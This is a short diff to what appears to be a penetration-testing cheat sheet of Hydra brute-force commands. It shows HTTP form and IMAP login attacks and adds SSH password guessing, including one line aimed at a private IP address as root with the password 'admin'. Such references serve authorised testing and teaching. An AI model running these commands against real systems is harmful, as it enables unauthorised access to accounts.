@@ -2,5 +2,9 @@
     hydra -l <username> -P <wordlist> <host> http-post-form "/:username=^USER^&password=^PASS^:F=<incorrect login message>" -V
 
 # Brute IMAP
-
     hydra -L <userslist> -P <wordlist> imap://<host>
+
+
+# Brute SSH
+    hydra -l root -p admin 192.168.1.105 -t 4 ssh
+    hydra -L <userslist> -P <wordlist> ssh://<host>
